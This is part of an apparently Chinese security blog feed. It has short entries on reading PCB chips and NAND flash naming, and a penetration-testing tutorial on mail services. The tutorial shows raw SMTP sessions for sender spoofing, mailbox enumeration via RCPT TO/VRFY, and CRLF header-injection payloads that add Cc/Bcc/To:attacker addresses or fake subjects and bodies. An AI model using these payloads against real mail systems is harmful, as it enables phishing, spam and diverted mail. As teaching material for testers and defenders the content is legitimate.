硬件分析</h2><p>查看PCB并识别出板上的所有芯片，查看芯片标签时，可以将芯片稍微倾斜，使用USB电子显微镜或者手机闪光灯查看标签设备。</p><p>如果识别出了芯片，可以在Google输入该芯片的制造厂商，再加上芯片型号以及datasheet（芯片数据手册），尝试搜索芯片的数据手册。</p><p>获得芯片数据手册后，可以使用手册中的信息识别出目标芯片的所有特征，包括引脚定义。</p>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>存储芯片</title>
    <link href="/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/"/>
    <url>/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/</url>
    
    <content type="html"><![CDATA[<h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p> CE：片选，大致来说，一个DIE(<strong>die:晶圆上的一个小块，就是一个晶片晶圆体，学名叫做die，封装后就成为一个颗粒</strong>)有一个CE，多CE的 单片闪存，就是多管芯的闪存，相当于一片闪存那么大的地方，装下了不止一片闪存，特别是BGA的板子，能实现单片双通道，就是这个原理。</p><p>通道数：通道数取决于主控IC的设计，一般现在的3.0板子都是双通道板子(还有坑爹的916单通道),也就是说支持双通道需要：主控的支持加上电路板的设计。理论上通道数翻倍，速度翻倍，TSOP的板子，一般来说，一面就是一个通道，多管芯的 TSOP 闪存，一般也只能单通道。尽量双贴。</p><p> DDR 、Toggle：它俩可以用约等于，”同步“，同步闪存 速度比 异步闪存快了很多，尽量选用支持 同步模式的 闪存，一般来说，DDR 需要在量产的时候勾选，但是Toggle 是 默认开启的，不需要特殊操作。<br>interleave ： 交错操作，简单的把U盘的存储过程分解，可以解释为：</p><pre><code>第一步：数据发到存储总线、存储总线 到 NAND Flash；第二步就是反过来，interleave模式 就是 一个CE在 执行 第一步的时候，另一个CE 可以同时的 执行第二步，interleave 的等级，取决于 一个通道上的闪存的 CE数。</code></pre><h2 id="东芝闪存-日本"><a href="#东芝闪存-日本" class="headerlink" title="东芝闪存(日本)"></a>东芝闪存(日本)</h2><p>东芝（Toshiba），是日本最大的半导体制造商，也是第二大综合电机制造商，隶属于三井集团。公司创立于1875年7月，原名东京芝浦电气株式会社，1939年由东京电气株式会社和芝浦制作所合并而成。</p><h3 id="闪存命名规则"><a href="#闪存命名规则" class="headerlink" title="闪存命名规则"></a>闪存命名规则</h3> <img src="/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/images/%E4%B8%9C%E8%8A%9D%E9%97%AA%E5%AD%98%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99.png" class=""> <img src="/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/images/%E4%B8%9C%E8%8A%9D%E9%97%AA%E5%AD%98%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%991.png" class=""><h4 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h4><p>对于东芝闪存来说，所有闪存部件都以字母T开头，分为TC58和TH58两种，前者代表单芯片封装（颗粒内只有一个闪存die），后者代表多芯片封装（颗粒内有多于1个die）。</p><p>五位“T”代表闪存接口类型为Toggle：一种由东芝和三星领导的闪存接口标准，区别于美光和海力士提出的ONFI标准。</p><p>第六位的“F”代表闪存工作的Vcc电压为2.35V<del>3.6V、VccQ电压为2.7V</del>3.6V或1.7V~1.95V。</p><p>第七和第八位需要连同在一起来看，代表闪存颗粒的容量，T0对应的是1T比特，也就是128GB。</p><p>第九位的“T“代表8 Level（3bit/cell），即TLC类型。</p><p>第十位的2代表Page页大小为16KB。</p><p>第11和第12位连在一起表达封装形式，TA表示使用无铅、无卤素环保工艺的TSOP封装。右数倒数第二位的“2”代表单闪存通道、2个CE引脚。</p><h2 id="旺宏MXIC-中国台湾"><a href="#旺宏MXIC-中国台湾" class="headerlink" title="旺宏MXIC(中国台湾)"></a>旺宏MXIC(中国台湾)</h2><p>MXIC 36nm NAND Flash，1GB闪存</p> <img src="/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/images/%E6%97%BA%E5%AE%8FFlash1.png" class=""><h2 id="Foresee江波龙-中国深圳"><a href="#Foresee江波龙-中国深圳" class="headerlink" title="Foresee江波龙(中国深圳)"></a>Foresee江波龙(中国深圳)</h2><p>FORESEE 江波龙 FS33ND01GS108TFI0 1Gib NAND 闪存颗粒</p> <img src="/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/images/%E6%B1%9F%E6%B3%A2%E9%BE%99Flash1.png" class=""><h2 id="ESMT晶豪科技-中国台湾"><a href="#ESMT晶豪科技-中国台湾" class="headerlink" title="ESMT晶豪科技(中国台湾)"></a>ESMT晶豪科技(中国台湾)</h2><p>晶豪ESMT M15T1G1664A，DDR3 1Gb 内存</p> <img src="/2021/08/22/%E5%AD%98%E5%82%A8%E8%8A%AF%E7%89%87/images/%E6%99%B6%E8%B1%AA%E7%A7%91%E6%8A%80Flash1.png" class="">]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
      <tag>flash</tag>
      
      <tag>闪存</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>邮件服务渗透</title>
    <link href="/2021/08/22/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F/"/>
    <url>/2021/08/22/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="POP3、SMTP和IMAP"><a href="#POP3、SMTP和IMAP" class="headerlink" title="POP3、SMTP和IMAP"></a>POP3、SMTP和IMAP</h2><p>SMTP</p><p>SMTP 的全称是“Simple Mail Transfer Protocol”，即简单邮件传输协议（25号端口）。它是一组用于从源地址到目的地址传输邮件的规范，通过它来控制邮件的中转方式。SMTP 协议属于 TCP/IP 协议簇，它帮助每台计算机在发送或中转信件时找到下一个目的地。SMTP是一个“推”的协议，它不允许根据需要从远程服务器上“拉”来消息。SMTP 服务器就是遵循 SMTP 协议的发送邮件服务器。<br>SMTP 认证，简单地说就是要求必须在提供了账户名和密码之后才可以登录 SMTP 服务器，这就使得那些垃圾邮件的散播者无可乘之机。<br>增加 SMTP 认证的目的是为了使用户避免受到垃圾邮件的侵扰。</p><p>IMAP</p><p>IMAP全称是Internet Mail Access Protocol，即交互式邮件存取协议，是一个应用层协议（端口是143）。用来从本地邮件客户端（Outlook Express、Foxmail、Mozilla Thunderbird等）访问远程服务器上的邮件。它是跟POP3类似邮件访问标准协议之一。不同的是，开启了IMAP后，您在电子邮件客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上，如：删除邮件，标记已读等，服务器上的邮件也会做相应的动作。所以无论从浏览器登录邮箱或者客户端软件登录邮箱，看到的邮件以及状态都是一致的。</p><p>POP3</p><p>POP3是Post Office Protocol 3的简称，即邮局协议的第3个版本,是TCP/IP协议族中的一员（默认端口是110）。本协议主要用于支持使用客户端远程管理在服务器上的电子邮件。,它规定怎样将个人计算机连接到Internet的邮件服务器和下载电子邮件的电子协议。它是因特网电子邮件的第一个离线协议标准,POP3允许用户从服务器上把邮件存储到本地主机（即自己的计算机）上,同时删除保存在邮件服务器上的邮件，而POP3服务器则是遵循POP3协议的接收邮件服务器，用来接收电子邮件的。</p><h2 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h2><ul><li>IMAP  SSL协议端口号：993           非SSL端口号：143</li><li>SMTP  SSL协议端口号：465/994   非SSL端口号：25</li><li>POP3   SSL协议端口号：995          非SSL端口号：110</li></ul><h2 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>SMTP 就是 Simple Mail Transfer Protocol 的缩写翻译来就是邮件传输协议，也就是用来发邮件的。IMAP 是 Internet Mail Access Protocol 的缩写，也就是用来收邮件的（和它类似的还有个 POP3，也是用来收邮件的）。</p><h3 id="工作机制"><a href="#工作机制" class="headerlink" title="工作机制"></a>工作机制</h3><p>SMTP通常有两种工作模式。发送SMTP和接收SMTP。具体工作方式为：发送SMTP在接收到用户的邮件请求后，判断此邮件是否为本地邮件，若是直接投送到用户的邮箱，否则向DNS查询远端邮件服务器的MX记录，并建立与远端接收SMTP之间的一个双向传送通道，此后SMTP命令由发送SMTP发出，由接收SMTP接收，而应答则反方向传送。一旦传送通道建立，SMTP发送者发送MAIL命令指明邮件发送者。如果SMTP接收者可以接收邮件则返回OK应答。SMTP发送者再发出RCPT命令确认邮件是否接收到。如果SMTP接收者接收，则返回OK应答；如果不能接收到，则发出拒绝接收应答（但不中止整个邮件操作），双方将如此反复多次。当接收者收到全部邮件后会接收到特别的序列，入伏哦接收者成功处理了邮件，则返回OK应答。</p><h3 id="SMTP的连接和发送过程"><a href="#SMTP的连接和发送过程" class="headerlink" title="SMTP的连接和发送过程"></a>SMTP的连接和发送过程</h3><ol><li><p>建立TCP连接</p></li><li><p>客户端发送HELO命令以标识发件人自己的身份，然后客户端发送MAIL命令；</p><pre><code>   服务器端以OK作为响应，表明准备接收</code></pre></li><li><p>客户端发送RCPT命令，以标识该电子邮件的计划接收人，可以有多个RCPT行；</p><pre><code>    服务器端则表示是否愿意为收件人接收邮件</code></pre></li><li><p>协商结束，发送邮件，用命令DATA发送</p></li><li><p>以.表示结束输入内容一起发送出去</p></li><li><p>结束此次发送，用QUIT命令退出</p></li></ol><h3 id="邮件头"><a href="#邮件头" class="headerlink" title="邮件头"></a>邮件头</h3><p>以下是常见的标题头字段说明。</p><ul><li><p>return-path：邮件的回复地址。</p></li><li><p>from：发件人地址。</p></li><li><p>to：收件人地址。</p></li><li><p>subject：邮件主题，即邮件名。</p></li><li><p>body：邮件内容。</p></li><li><p>date：邮件发送日期。</p></li><li><p>cc：抄送。</p></li><li><p>bcc：密送。</p><p>………..</p></li></ul><h3 id="发送邮件"><a href="#发送邮件" class="headerlink" title="发送邮件"></a>发送邮件</h3><h4 id="简单的发送"><a href="#简单的发送" class="headerlink" title="简单的发送"></a>简单的发送</h4><ol><li><strong>建立TCP连接</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ru">$ telnet xxxx.com 25 #widnows下测试<br># 或者<br>$ nc xxxxx.com 25   #Linux下测试<br></code></pre></td></tr></table></figure><p>服务器返回220状态码，就表示连接成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ru">220 MAIL-SERVER Winmail Mail Server ESMTP ready<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>HELO 命令和 EHLO 命令</strong></li></ol><p>SMTP 协议规定，连接成功后，必须向邮件服务器提供连接的域名，也就是邮件将从哪台服务器发来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ru">HELO xxxx.com<br></code></pre></td></tr></table></figure><p>邮件服务器返回状态码250，表示响应成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ru">250 MAIL-SERVER Winmail Mail Server<br></code></pre></td></tr></table></figure><p><code>HELO</code>命令现在比较少用，一般都使用<code>EHLO</code>命令。<br>邮件服务器收到<code>EHLO</code>命令以后，不仅会返回<code>250</code>状态码，还会返回自己支持的<code>各种扩展的列表</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ru">250-MAIL-SERVER Winmail Mail Server<br>250-AUTH LOGIN PLAIN<br>250-SIZE 20971520<br>250 8BITMIME<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>MAIL FROM 命令</strong></li></ol><p>连接者要使用MAIL FROM命令，向邮件服务器提供邮件的来源邮箱</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ru">MAIL FROM:admin@xxxx.com  #伪造管理员身份来发邮件<br></code></pre></td></tr></table></figure><p>上面代码表示，连接者将从<code>admin@xxxxx.com</code>向邮件服务器发送邮件。邮件服务器返回<code>250</code>状态码，表示响应成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ru">250 ok<br></code></pre></td></tr></table></figure><ol start="4"><li><strong>RCPT TO 命令</strong></li></ol><p>使用RCPT TO命令，验证邮件地址是否存在。如果查询的是一个真实的 Email 地址，邮件服务器就会返回<code>250</code>状态码。验证邮箱存在的话，还可以给这个接受者邮箱发送邮件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ru">RCPT TO:admin@xxxxx.com<br>250 ok<br></code></pre></td></tr></table></figure><p>一般来说，状态码 250 和 251 都表示邮箱存在，状态码 5xx 表示不存在，其他状态码（主要是 4xx）则代表无法确认。</p><ol start="5"><li><strong>DATA 伪造邮箱数据</strong></li></ol><p>使用DATA命令来伪造邮箱内容,客户端告诉服务器自己准备发送邮件正文<br>服务器返回354，表示自己已经作好接受邮件的准备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ru">DATA<br>354 go ahead, end data with CRLF.CRLF<br></code></pre></td></tr></table></figure><p>输入邮件伪造正文</p><p>用<code>英文状态的双引号</code>来修饰正文，正文结束后，发送结束符<code>.</code>表明正文的结束。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ru">&quot;这是一个邮件伪造测试&quot;<br>.<br>250 ok message accepted for delivery<br></code></pre></td></tr></table></figure><ol start="6"><li><strong>退出TCP连接</strong></li></ol><p>邮件发送结束，客户端请求断开连接后，使用<code>QUIT</code>命令关闭 TCP 连接。<br>服务器返回<code>211</code>，提示断开申请被采纳，并主动断开连接，整个邮件发送过程结束。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ru">QUIT<br>221 MAIL-SERVER Winmail Mail Server<br>Connection closed by foreign host.<br></code></pre></td></tr></table></figure><h4 id="不带附件"><a href="#不带附件" class="headerlink" title="不带附件"></a>不带附件</h4><p>1：黑色字体是cmd里输入的。’//’后面是返回的数据。<br>2：cmd里面不能手动输汉字什么的，只能复制粘贴靠谱点。<br>3：空行和邮件QUIT结束前的那个’.’号都是必须输入的。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">telnet</span> ip/域名 <span class="hljs-number">25</span>      *//<span class="hljs-number">1</span>、EHLO，期待返回<span class="hljs-number">220</span>或者<span class="hljs-number">250</span>*<br></code></pre></td></tr></table></figure><p><em>//220 163.com Anti-spam GT for Coremail System (163com[20141201])</em></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ehlo <span class="hljs-number">163</span>.dcom *<span class="hljs-regexp">//</span>向邮件服务器提供连接的域名，也就是邮件将从哪台服务器发来， 除了HELO所具     有的功能外，EHLO主要用来查询服务器支持的扩充功能*<br></code></pre></td></tr></table></figure><p><em>//250 OK</em>    </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">auth</span> login   *//<span class="hljs-number">2</span>、发送Auth Login，期待返回<span class="hljs-number">334</span>*<br></code></pre></td></tr></table></figure><p><em>//334 dXNlcm5hbWU6      /*Base64:”username:”*/</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MTIzNDU2QDE2My5jb20</span>=    *//<span class="hljs-number">3</span>、Base<span class="hljs-number">64</span>:<span class="hljs-string">&quot;123456@163.com 发送经过Base64编码的用户名，期待返回334*</span><br></code></pre></td></tr></table></figure><p><em>//334 UGFzc3dvcmQ6      /*Base64:”Password:”*/</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MTIzNDU2</span>                *//<span class="hljs-number">4</span>、Base<span class="hljs-number">64</span>:<span class="hljs-string">&quot;123456&quot;</span> 发送经过Base<span class="hljs-number">64</span>编码的密码，期待返回<span class="hljs-number">235</span>*<br></code></pre></td></tr></table></figure><p><em>//235 Authentication successful</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mail</span> from:&lt;<span class="hljs-number">123456</span>@<span class="hljs-number">163</span>.com&gt;        *//<span class="hljs-number">5</span>、发件人邮箱 发送Mail From，期待返回<span class="hljs-number">250</span>*<br></code></pre></td></tr></table></figure><p><em>//250 Mail OK</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rcpt</span> to:&lt;<span class="hljs-number">123456</span>@qq.com&gt;              *//<span class="hljs-number">6</span>、收件人邮箱 发送Rcpt To。期待返回<span class="hljs-number">250</span>*<br></code></pre></td></tr></table></figure><p><em>//250 Mail OK</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">data</span>                                                *//<span class="hljs-number">7</span>、发送DATA，期待返回<span class="hljs-number">354</span>*<br></code></pre></td></tr></table></figure><p><em>//354 End data with . /*这里提示你了,结束是使用‘回车换行.回车换行’*/</em></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Date</span>: <span class="hljs-number">12</span> Apr <span class="hljs-number">2016</span> <span class="hljs-number">17</span>:<span class="hljs-number">22</span>:<span class="hljs-number">29</span>       *//时间<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">From</span>:<span class="hljs-string">&quot;测试CMD&quot;</span>&lt;<span class="hljs-number">123456</span>@<span class="hljs-number">163</span>.com&gt;      *//<span class="hljs-number">8</span>.<span class="hljs-number">0</span>、发件人显示名,邮箱发送From*<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">To</span>:&lt;<span class="hljs-number">123456</span>@qq.com&gt;                    *//<span class="hljs-number">8</span>.<span class="hljs-number">1</span>、收件人邮箱 发送To*<br></code></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Reply-To: <span class="hljs-symbol">123456@</span><span class="hljs-number">163.</span>com        *<span class="hljs-comment">//回复地址 还是填发件人邮箱\*/*</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Mailer: The Bat! (v<span class="hljs-number">3</span>.<span class="hljs-number">02</span>) Professional.      *//代理发信的客户端,这两行X-的不写也行\*/*<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Priority: <span class="hljs-number">3</span> (Normal)<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Subject</span>:CMD命令发送的邮件                   *//<span class="hljs-number">8</span>.<span class="hljs-number">2</span>、信件的主题 发送标题*<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MIME</span>-Version: <span class="hljs-number">1</span>.<span class="hljs-number">0</span>                                   *//<span class="hljs-number">8</span>.<span class="hljs-number">3</span>、发送其他Header内容*<br></code></pre></td></tr></table></figure><p><em>/*普通不带附件的写法*/</em></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Content-<span class="hljs-keyword">type</span>: <span class="hljs-type">text</span>/plain; charset=&quot;gb2312&quot;  *// 想发送HTML格式的文本用<span class="hljs-type">text</span>/html <br><br>Content-Transfer-<span class="hljs-keyword">Encoding</span>: <span class="hljs-number">7</span>bit<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">空格 *<span class="hljs-regexp">//</span><span class="hljs-number">8.4</span>、发送一个空行，结束Header发送* <br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">这是一个CMD命令发送的邮件！！！      *<span class="hljs-regexp">//</span><span class="hljs-number">8.5</span>、发送信件主体*<br>--TESTMAIL--<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.      <span class="hljs-regexp">//</span>.代表结束<br></code></pre></td></tr></table></figure><p>//250 Mail OK queued as smtp14,EsCowED5tEVmcxhXlcgQAA–.7461S3 1461220657</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">QUIT</span>                                                //<span class="hljs-number">10</span>、发送Quit，退出，期待返回<span class="hljs-number">221</span><br></code></pre></td></tr></table></figure><p>/* 邮件发送结束了 */</p><h4 id="带附件"><a href="#带附件" class="headerlink" title="带附件"></a>带附件</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">/*带附件的比不带附加的多三行命令，后两行是一样的，前三行是加的*/</span><br>Content-<span class="hljs-keyword">Type</span>: multipart/mixed;boundary=&quot;TESTMAIL&quot;<br><br><span class="hljs-comment">--TESTMAIL</span><br>Content-<span class="hljs-keyword">type</span>: <span class="hljs-type">text</span>/plain; charset=&quot;gb2312&quot;<br>Content-Transfer-<span class="hljs-keyword">Encoding</span>: <span class="hljs-number">7</span>bit<br><br><span class="hljs-comment">/*然后发送附件的话每个附加发送的头都要加下面的命令*/</span><br><span class="hljs-comment">--TESTMAIL</span><br>Content-<span class="hljs-keyword">Type</span>: application/x-msdownload; <span class="hljs-type">name</span>=&quot;D:\1.html&quot;<br>Content-Transfer-<span class="hljs-keyword">Encoding</span>: base64<br>Content-Disposition: attachment; filename=&quot;D:\1.html&quot;<br></code></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>VRFY——用于验证给定用户邮箱是否存在，以及接收关于该用户的详细信息；</p><p>EXPN——用于扩充邮件列表</p><h3 id="IMAP-SMTP注入"><a href="#IMAP-SMTP注入" class="headerlink" title="IMAP/SMTP注入"></a>IMAP/SMTP注入</h3><p>IMAP/SMTP 注入也就是收邮件发邮件的注入，有很多类似于这样的功能，例如要发消息给某个用户组或者某个用户，程序会提供一个发邮件的方式，输入名称、邮件地址、邮件内容即可。或者是一些重要的邮件通知功能找回密码登录等，要用户填入信息进行验证发送邮件给自己。而注入就是未对用户输入的地址做严格的过滤和限制，导致可以加入一些其他的邮件头，例如 CC 抄送等。</p><p>发一封信，包含smtp协议部分和信体部分。</p><p>协议部分，比如sent from，rcpt to等命令</p><p>信体中则才包含from，to，cc等头部。比如我们用foxmail收到一封信，你在foxmail里看到的这封信的所有内容就是信体部分，包含发件人，收件人，抄送，标题等。</p><p>当一封信有多个收件人，包含to，cc和bcc，smtp协议首先会把所有的收件人逐个进行rcpt to，然后信体部分包含to和cc的头部（注意不包含bcc的头部，这也是为什么信体中看不到暗送收件人的原因）</p><p><strong>只有被rcpt to的收件人才会收到信件。</strong></p><p> 举个例子</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">sender</span>：<span class="hljs-selector-attr">[send@dyang.com]</span>(<span class="hljs-attribute">mailto</span>:send<span class="hljs-variable">@dyang</span>.com)<br><br><span class="hljs-selector-tag">to1</span>:<span class="hljs-selector-tag">to1</span>@<span class="hljs-selector-tag">dyang</span><span class="hljs-selector-class">.com</span><br><br><span class="hljs-selector-tag">cc1</span>:<span class="hljs-selector-tag">cc1</span>@<span class="hljs-selector-tag">dyang</span><span class="hljs-selector-class">.com</span><br><br><span class="hljs-selector-tag">bcc1</span>:<span class="hljs-selector-tag">bcc1</span>@<span class="hljs-selector-tag">dyang</span><span class="hljs-selector-class">.com</span><br></code></pre></td></tr></table></figure><p>这封信要被发出去，步骤是这样的：</p><p>1.smtp协议进行rcpt to命令，对象为所有收件人，<a href="mailto:to1@dyang.com,cc1@dyang.com,bcc1@dyang.com">to1@dyang.com,cc1@dyang.com,bcc1@dyang.com</a></p><p>2.信体部分，加上几个头部</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">to:</span><span class="hljs-keyword">to</span><span class="hljs-number">1</span><span class="hljs-title">@dyang.com</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">cc:</span><span class="hljs-keyword">cc</span><span class="hljs-number">1</span><span class="hljs-title">@dyang.com</span><br></code></pre></td></tr></table></figure><p>注意不会填加bcc头部。</p><p>3.然后加载信件主体部分再发出去。</p><p>4.收件人收信。因为收件人看到的信件是信体部分，所有看不到bcc的收件人。这样达到了暗送的目的。</p><h4 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h4><ol><li>   CC/BCC注入</li></ol><p>在发送者字段(sender)后注入CC和BCC参数</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">From:sender<span class="hljs-title">@domain.com</span><span class="hljs-variable">%0</span>ACc:recipient<span class="hljs-title">@domain.com</span><span class="hljs-variable">%0</span>ABcc:recipient<span class="hljs-number">1</span><span class="hljs-title">@domain.com</span><br></code></pre></td></tr></table></figure><p>所以现在,消息将被发送到recipient和recipient1账户。</p><ol start="2"><li>   参数注射</li></ol><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">From:sender<span class="hljs-title">@domain.com</span><span class="hljs-variable">%0</span>ATo:attacker<span class="hljs-title">@domain.com</span><br></code></pre></td></tr></table></figure><p>现在消息将被发送到原来的收件人和攻击者帐户。注意，这里的攻击者的账户是我们通过注入额外传入的。</p><ol start="3"><li>   邮件主题注入</li></ol><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">From:sender<span class="hljs-title">@domain.com</span><span class="hljs-variable">%0</span>ASubject:This’s<span class="hljs-variable">%20</span>Fake<span class="hljs-variable">%20</span>Subject<br></code></pre></td></tr></table></figure><p>攻击者注入的假的主题subject将被添加到原来的主题中并且在某些情况下将取代原本的主题subject。这取决于邮件服务行为。即代码编写的容错性，当参数中出现两个subject的时候代码是选择丢弃还是后者覆盖。</p><ol start="4"><li>   改变消息的主体body</li></ol><p>要注意SMTP的Mail格式，消息主题和头部Header之间有两个换行符(和HTTP是一样的)。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">From:sender<span class="hljs-title">@domain.com</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>AMy<span class="hljs-variable">%20</span>New<span class="hljs-variable">%20</span><span class="hljs-variable">%0</span>Fake<span class="hljs-variable">%20</span>Message.<br></code></pre></td></tr></table></figure><p>假消息将被添加到原始消息中。</p><h4 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h4><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">test@test.com\nbcc:hack@hack.com<br></code></pre></td></tr></table></figure><p>发送后邮件会抄送给<a 